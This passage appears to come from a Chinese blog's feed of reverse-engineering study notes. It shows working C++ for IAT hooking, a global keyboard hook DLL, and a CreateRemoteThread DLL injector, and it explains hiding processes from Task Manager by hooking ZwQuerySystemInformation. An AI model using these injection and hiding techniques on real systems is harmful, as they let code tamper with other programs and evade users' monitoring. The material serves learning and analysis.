szDllName, PROC pfnOrg,PROC pfnNew)</span></span><br><span class="hljs-function"></span>&#123;<br>    HMODULE hMod;<br>    LPCSTR szLibName;<br>    PIMAGE_IMPORT_DESCRIPTOR pImportDesc;<span class="hljs-comment">//输入表</span><br>    PIMAGE_THUNK_DATA pThunk;<br>    DWORD dwOldProtect ,dwRVA;<br>    PBYTE pAddr;    <br><br>    hMod = <span class="hljs-built_in">GetModuleHandle</span>(<span class="hljs-literal">NULL</span>);<span class="hljs-comment">//获取当前PE文件的地址</span><br>    pAddr = (PBYTE)hMod;<br>    <span class="hljs-comment">//在MS-DOS头部找到e_lfanew字段，该字段存放着PE文件头的偏移地址</span><br>    pAddr += *((DWORD*)&amp;pAddr[<span class="hljs-number">0x3c</span>]);<br><br>    <span class="hljs-comment">//相对于PE文件头偏移0x80存放着输入表的地址</span><br>    dwRVA = *((DWORD*)&amp;pAddr[<span class="hljs-number">0x80</span>]);<br><br>    pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)hMod + dwRVA);<br><br>    <span class="hljs-comment">//遍历DLL的名称</span><br>    <span class="hljs-keyword">for</span> (; pImportDesc-&gt;Name; pImportDesc++)<br>    &#123;<br>        szLibName = (LPSTR)((DWORD)hMod + pImportDesc-&gt;Name);<br><br>        <span class="hljs-comment">//判断DLL名称是否为user32.dll</span><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">stricmp</span>(szLibName, szDllName))<br>        &#123;<br>            pThunk = (PIMAGE_THUNK_DATA)((DWORD)hMod + pImportDesc-&gt;FirstThunk);<br>            <span class="hljs-keyword">for</span> (; pThunk-&gt;u1.Function; pThunk++)<br>            &#123;<br>                <span class="hljs-comment">//判断函数地址是否为setWindowText函数地址</span><br>                <span class="hljs-keyword">if</span> (pThunk-&gt;u1.Function == (DWORD)pfnOrg)<br>                &#123;<br>                    <span class="hljs-comment">//将内存空间权限修改为可读可写</span><br>                    <span class="hljs-built_in">VirtualProtect</span>((LPVOID)&amp;pThunk-&gt;u1.Function, <span class="hljs-number">4</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);<br>                    <span class="hljs-comment">//修改IAT表内的地址</span><br>                    pThunk-&gt;u1.Function = (DWORD)pfnNew;<br>                    <span class="hljs-comment">//将内存权限修改回来</span><br>                    <span class="hljs-built_in">VirtualProtect</span>((LPVOID)&amp;pThunk-&gt;u1.Function, <span class="hljs-number">4</span>, dwOldProtect, &amp;dwOldProtect); <br>                    <span class="hljs-keyword">return</span> TRUE;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> FALSE;<br><br>&#125;<br><br><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">( HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">                       DWORD  ul_reason_for_call,</span></span><br><span class="hljs-params"><span class="hljs-function">                       LPVOID lpReserved</span></span><br><span class="hljs-params"><span class="hljs-function">                     )</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        g_pOrgFunc = <span class="hljs-built_in">GetProcAddress</span>(<span class="hljs-built_in">GetModuleHandleA</span>(<span class="hljs-string">&quot;user32.dll&quot;</span>), <span class="hljs-string">&quot;SetWindowTextW&quot;</span>);<br>        <span class="hljs-built_in">hook_iat</span>(<span class="hljs-string">&quot;user32.dll&quot;</span>, g_pOrgFunc, (PROC)MySetWindowTextW);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>            <span class="hljs-keyword">break</span>;                 <span class="hljs-comment">//break需要添加否则无法更换IAT地址</span><br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>            <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-built_in">hook_iat</span>(<span class="hljs-string">&quot;user32.dll&quot;</span>, (PROC)MySetWindowTextW,g_pOrgFunc);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="进程隐藏"><a href="#进程隐藏" class="headerlink" title="进程隐藏"></a>进程隐藏</h1><p>通过修改<code>API</code>代码实现<code>API</code>钩取的技术。库文件被加载到内存后，在其目录映像中直接修改要钩取的<code>API</code>代码本身。</p><p>用户模式下检测进程的相关<code>API</code>通常分为两种</p><ul><li><code>CreateToolhelp32Snapshot()</code></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//通过获取进程信息为指定的进程、进程使用的堆[HEAP]、模块[MODULE]、线程建立一个快照</span><br><span class="hljs-function">HANDLE WINAPI <span class="hljs-title">CreateToolhelp32Snapshot</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">DWORD dwFlags,</span></span><br><span class="hljs-params"><span class="hljs-function">DWORD th32ProcessID</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><ul><li><code>EnumProcess()</code></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//检索系统中每个进程对象的进程标识符</span><br><span class="hljs-built_in">EnumProcesses</span>(<br>DWORD* pProcessIds, <span class="hljs-comment">//指向接收进程标识符列表的数组的指针</span><br>DWORD cb, <span class="hljs-comment">//pProcessIds数组的大小</span><br>DWORD* pBytesReturned <span class="hljs-comment">//pProcessIds数组中返回的字节数</span><br>);<br></code></pre></td></tr></table></figure><p>上述两种<code>API</code>都在内部调用了<code>ntdll.ZwQuerySystemInformation() API</code></p><ul><li><code>ZwQuerySystemInformation()</code></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//检索指定的系统信息</span><br><span class="hljs-function">NTSTATUS WINAPI <span class="hljs-title">ZwQuerySystemInformation</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,<span class="hljs-comment">//要检索的系统信息的类型</span></span></span><br><span class="hljs-params"><span class="hljs-function">  _Inout_   PVOID                    SystemInformation,<span class="hljs-comment">//指向接收请求信息的缓冲区的指针</span></span></span><br><span class="hljs-params"><span class="hljs-function">  _In_      ULONG                    SystemInformationLength,<span class="hljs-comment">//参数指向的缓冲区的大小</span></span></span><br><span class="hljs-params"><span class="hljs-function">  _Out_opt_ PULONG                   ReturnLength<span class="hljs-comment">//指向函数写入请求信息的实际大小的位置的可选指针</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><p><code>ProcExp.exe</code>:进程查看器</p><p><code>taskmgr.exe</code>:任务管理器</p><p>通过钩取上述两个进程可以将目标进程进行隐藏，但是该钩取方法存在缺陷：</p><ol><li>检索进程的工具不仅仅是上述两个进程</li><li>若用户再次开启一个<code>ProcExp.exe</code>或者<code>taskmgr.exe</code>，则旧的<code>ProcExp.exe</code>或者<code>taskmgr.exe</code>被钩取可以达到隐藏进程的效果，但是新的<code>ProcExp.exe</code>或者<code>taskmgr.exe</code>未被钩取因此无法隐藏。</li></ol><p>解决方法：全局钩取</p>]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>逆向工程核心原理--DLL注入</title>
    <link href="/2023/06/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86--DLL%E6%B3%A8%E5%85%A5/"/>
    <url>/2023/06/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86--DLL%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="键盘消息钩取"><a href="#键盘消息钩取" class="headerlink" title="键盘消息钩取"></a>键盘消息钩取</h1><h2 id="KeyHook"><a href="#KeyHook" class="headerlink" title="KeyHook"></a><strong>KeyHook</strong></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;pch.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdio.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEF_PROCESS_NAME <span class="hljs-string">&quot;notepad.exe&quot;</span></span><br><br>HINSTANCE g_hInstance = <span class="hljs-literal">NULL</span>;<br>HHOOK g_hHook = <span class="hljs-literal">NULL</span>;<br>HWND g_hWnd = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">( HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">                       DWORD  ul_reason_for_call,</span></span><br><span class="hljs-params"><span class="hljs-function">                       LPVOID lpReserved</span></span><br><span class="hljs-params"><span class="hljs-function">                     )</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        g_hInstance = hModule;<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">LRESULT为长整形指针</span><br><span class="hljs-comment">每当需要处理键盘消息时就会调用此函数</span><br><span class="hljs-comment">参数一：nCode,如果code小于零，则挂钩过程必须将消息传递给CallNextHookEx函数而不进行进一步处理，并且应该返回CallNextHookEx返回的值。</span><br><span class="hljs-comment">参数二：wParam，生成击键消息的虚拟键代码</span><br><span class="hljs-comment">参数三：当第31位为0时则按键被按下，当为1时表示按键释放</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function">LRESULT CALLBACK <span class="hljs-title">KeyboardProc</span><span class="hljs-params">(<span class="hljs-type">int</span> nCode, WPARAM wParam, LPARAM lParam)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">char</span> szPath[MAX_PATH] = &#123; <span class="hljs-number">0</span>, &#125;;<br>    <span class="hljs-type">char</span>* p = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-keyword">if</span> (nCode == <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        */</span><br>        <span class="hljs-keyword">if</span> (!(lParam &amp; <span class="hljs-number">0x80000000</span>))<br>        &#123;<br>            <span class="hljs-built_in">GetModuleFileNameA</span>(<span class="hljs-literal">NULL</span>, szPath, MAX_PATH);<br>            p = <span class="hljs-built_in">strrchr</span>(szPath, <span class="hljs-string">&#x27;\\&#x27;</span>);<br><br>            <span class="hljs-keyword">if</span> (!_stricmp(p + <span class="hljs-number">1</span>, DEF_PROCESS_NAME))<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//返回到钩链中的下一个函数</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">CallNextHookEx</span>(g_hHook, nCode, wParam, lParam);<br><br>&#125;<br><br><span class="hljs-comment">//判断是否使用c++编写</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __cplusplus</span><br><span class="hljs-comment">//使用与C语言一致的编译过程</span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    __declspec(dllexport)将DLL中的函数导出给其他应用程序使用</span><br><span class="hljs-comment">    */</span><br>    __declspec(dllexport) <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">HookStart</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span>&#123;<br>        g_hHook = <span class="hljs-built_in">SetWindowsHookEx</span>(WH_KEYBOARD, KeyboardProc, g_hInstance, <span class="hljs-number">0</span>);<br>    &#125;<br>    __declspec(dllexport) <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">HookStop</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (g_hHook)<br>        &#123;<br>            <span class="hljs-built_in">UnhookWindowsHookEx</span>(g_hHook);<br>            g_hHook = <span class="hljs-literal">NULL</span>;<br>        &#125;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span>  __cplusplus</span><br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">//  __cplusplus</span></span><br></code></pre></td></tr></table></figure><h2 id="HookMain"><a href="#HookMain" class="headerlink" title="HookMain"></a>HookMain</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;conio.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;Windows.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEF_DLL_NAME <span class="hljs-string">&quot;KeyHook.dll&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEF_HOOKSTART <span class="hljs-string">&quot;HookStart&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEF_HOOKSTOP <span class="hljs-string">&quot;HookStop&quot;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">void</span> <span class="hljs-params">(*PFN_HOOKSTART)</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">void</span> <span class="hljs-params">(*PFN_HOOKSTOP)</span><span class="hljs-params">()</span></span>;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>HMODULE hDll = <span class="hljs-literal">NULL</span>;<br>PFN_HOOKSTART HookStart = <span class="hljs-literal">NULL</span>;<br>PFN_HOOKSTOP HookStop = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">char</span> ch = <span class="hljs-number">0</span>;<br>    <br>    <span class="hljs-comment">//加载KeyHook.dll</span><br>hDll = <span class="hljs-built_in">LoadLibraryA</span>(DEF_DLL_NAME);<br>    <br>    <span class="hljs-comment">//获取开始Hook的函数地址</span><br>HookStart = (PFN_HOOKSTART)<span class="hljs-built_in">GetProcAddress</span>(hDll, DEF_HOOKSTART);<br>    <span class="hljs-comment">//获取停止Hook的函数地址</span><br>HookStop = (PFN_HOOKSTOP)<span class="hljs-built_in">GetProcAddress</span>(hDll, DEF_HOOKSTOP);<br><br>    <span class="hljs-comment">//Hook开始</span><br><span class="hljs-built_in">HookStart</span>();<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;press &#x27;q&#x27; to quit!\n&quot;</span>);<br><span class="hljs-keyword">while</span> (_getch() != <span class="hljs-string">&#x27;q&#x27;</span>);<br>    <span class="hljs-comment">//Hook停止</span><br><span class="hljs-built_in">HookStop</span>();<br>    <br>    <span class="hljs-comment">//卸载DLL</span><br><span class="hljs-built_in">FreeLibrary</span>(hDll);<br><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="DLL注入"><a href="#DLL注入" class="headerlink" title="DLL注入"></a>DLL注入</h1><p><code>DLL</code>注入指的是向运行中的其他进程强制插入特定的<code>DLL</code>文件。</p><h2 id="DLL注入的实现方法"><a href="#DLL注入的实现方法" class="headerlink" title="DLL注入的实现方法"></a>DLL注入的实现方法</h2><ul><li><p>创建远程线程(<code>CreateRemoteThread()API</code>)</p></li><li><p>使用注册表(<code>AppInit_DLLs</code>值)</p></li><li><p>消息钩取(<code>SetWindowsHookEx()API</code>)</p></li></ul><h3 id="创建远程线程"><a href="#创建远程线程" class="headerlink" title="创建远程线程"></a>创建远程线程</h3><h4 id="InjectDll"><a href="#InjectDll" class="headerlink" title="InjectDll"></a>InjectDll</h4><p><code>InjectDll</code>需要传入需要注入的进程号，在该进程的空间内开辟一段区域用于创建线程运行<code>LoadLibrary()</code>方法载入<code>DLL</code>文件，从而达到<code>DLL</code>注入的目的。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;tchar.h&gt;</span></span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">* LPCTSTR含义</span><br><span class="hljs-comment">* L代表long长整型</span><br><span class="hljs-comment">* P代表指针</span><br><span class="hljs-comment">* C代表不可改变</span><br><span class="hljs-comment">* T代表char，若定义了UNICODE则代表wchar_t</span><br><span class="hljs-comment">* STR代表字符串</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function">BOOL <span class="hljs-title">InjectDll</span><span class="hljs-params">(DWORD dwPID, LPCTSTR szDllPath)</span></span><br><span class="hljs-function"></span>&#123;<br>HANDLE hProcess = <span class="hljs-literal">NULL</span>, hThread = <span class="hljs-literal">NULL</span>;<br>HMODULE hMod = <span class="hljs-literal">NULL</span>;<br>LPVOID pRemoteBuf = <span class="hljs-literal">NULL</span>;<br>DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + <span class="hljs-number">1</span>) * <span class="hljs-built_in">sizeof</span>(TCHAR);<br><br><span class="hljs-comment">//函数指针</span><br>LPTHREAD_START_ROUTINE pThreadProc;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">*打开现有的本地进程对象</span><br><span class="hljs-comment">*   HANDLE OpenProcess(</span><br><span class="hljs-comment">*[in] DWORD dwDesiredAccess,对进程对象访问的权限 PROCESS_ALL_ACCESS即所有权限</span><br><span class="hljs-comment">*[in] BOOL  bInheritHandle,进程是否继承句柄，FALSE为否</span><br><span class="hljs-comment">*[in] DWORD dwProcessId，进程号</span><br><span class="hljs-comment">*返回值，打开进程的句柄</span><br><span class="hljs-comment">*);</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">if</span> (!(hProcess = <span class="hljs-built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPID)))<br>&#123;<br>_tprintf(<span class="hljs-string">L&quot;OpenProcess(%d) failed!!! [%d]\n&quot;</span>, dwPID, GetLastError);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">* 在指定进程的虚拟地址空间内保留、提交或更改内存区域的状态。</span><br><span class="hljs-comment">*LPVOID VirtualAllocEx(</span><br><span class="hljs-comment">*[in]           HANDLE hProcess,进程句柄，该函数在该进程的虚拟地址空间内分配内存</span><br><span class="hljs-comment">*[in, optional] LPVOID lpAddress,为要分配的页面区域指定所需起始地址的指针</span><br><span class="hljs-comment">*[in]           SIZE_T dwSize,要分配的内存区域的大小，以字节为单位</span><br><span class="hljs-comment">*[in]           DWORD  flAllocationType,内存分配的类型，MEM_COMMIT为指定的保留内存页面分配内存费用</span><br><span class="hljs-comment">*[in]           DWORD  flProtect,要分配的页面区域的内存保护,PAGE_READWRITE,启用对已提交页面区域的执行、只读或读/写访问。</span><br><span class="hljs-comment">*);</span><br><span class="hljs-comment">* 返回值，如果函数成功，则返回值非零。如果函数失败，则返回值为 0（零）</span><br><span class="hljs-comment">*/</span><br>pRemoteBuf = <span class="hljs-built_in">VirtualAllocEx</span>(hProcess, <span class="hljs-literal">NULL</span>, dwBufSize, MEM_COMMIT, PAGE_READWRITE);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">* 将数据写入指定进程中的内存区域。要写入的整个区域必须可访问，否则操作将失败。</span><br><span class="hljs-comment">* BOOL WriteProcessMemory(</span><br><span class="hljs-comment">*[in]  HANDLE  hProcess,要修改的进程内存的句柄,句柄必须具有对进程的 PROCESS_VM_WRITE 和 PROCESS_VM_OPERATION 访问权限。</span><br><span class="hljs-comment">*[in]  LPVOID  lpBaseAddress,指向要写入数据的指定进程中的起始地址</span><br><span class="hljs-comment">*[in]  LPCVOID lpBuffer,指向缓冲区的指针，该缓冲区包含要写入指定进程地址空间的数据</span><br><span class="hljs-comment">*[in]  SIZE_T  nSize,要写入指定进程的字节数</span><br><span class="hljs-comment">*[out] SIZE_T  *lpNumberOfBytesWritten，指向变量的指针，该变量接收传输到指定进程的字节数，NULL则忽略该参数</span><br><span class="hljs-comment">*);</span><br><span class="hljs-comment">*/</span><br><span class="hljs-built_in">WriteProcessMemory</span>(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, <span class="hljs-literal">NULL</span>);<br><br>hMod = <span class="hljs-built_in">GetModuleHandle</span>(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);<br>pThreadProc = (LPTHREAD_START_ROUTINE)<span class="hljs-built_in">GetProcAddress</span>(hMod, <span class="hljs-string">&quot;LoadLibraryW&quot;</span>);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">* 创建在另一个进程的虚拟地址空间中运行的线程</span><br><span class="hljs-comment">* HANDLE CreateRemoteThread(</span><br><span class="hljs-comment">*[in]  HANDLE                 hProcess,要在其中创建线程的进程的句柄</span><br><span class="hljs-comment">*[in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes,指向 SECURITY_ATTRIBUTES结构的指针，该结构指定新线程的安全描述符并确定子进程是否可以继承返回的句柄</span><br><span class="hljs-comment">*[in]  SIZE_T                 dwStackSize,堆栈的初始大小，以字节为单位</span><br><span class="hljs-comment">*[in]  LPTHREAD_START_ROUTINE lpStartAddress,指向要由线程执行的LPTHREAD_START_ROUTINE 类型的应用程序定义函数的指针</span><br><span class="hljs-comment">*[in]  LPVOID                 lpParameter,指向要传递给线程函数的变量的指针</span><br><span class="hljs-comment">*[in]  DWORD                  dwCreationFlags,控制线程创建的标志,0表示线程在创建后立即运行</span><br><span class="hljs-comment">*[out] LPDWORD                lpThreadId，指向接收线程标识符的变量的指针</span><br><span class="hljs-comment">*);</span><br><span class="hljs-comment">*   如果函数成功，则返回值是新线程的句柄</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">/*创建线程执行LoadLibraryW(DllPath)*/</span><br>hThread = <span class="hljs-built_in">CreateRemoteThread</span>(<br>hProcess,<br><span class="hljs-literal">NULL</span>,<br><span class="hljs-number">0</span>,<br>pThreadProc,<br>pRemoteBuf,<br><span class="hljs-number">0</span>,<br><span class="hljs-literal">NULL</span><br>);<br><br><span class="hljs-comment">/*等到线程执行操作*/</span><br><span class="hljs-built_in">WaitForSingleObject</span>(hThread, INFINITE);<br><br><span class="hljs-built_in">CloseHandle</span>(hThread);<br><span class="hljs-built_in">CloseHandle</span>(hProcess);<br><br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><span class="hljs-type">int</span> _tmain(<span class="hljs-type">int</span> argc, TCHAR* argv[])<br>&#123;<br><span class="hljs-keyword">if</span> (argc != <span class="hljs-number">3</span>)<br>&#123;<br>_tprintf(<span class="hljs-string">L&quot;USAG : %s pid dll_path\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">InjectDll</span>((DWORD)_tstol(argv[<span class="hljs-number">1</span>]), argv[<span class="hljs-number">2</span>]))<br>_tprintf(<span class="hljs-string">L&quot;InjectDll(\&quot;s\&quot;) 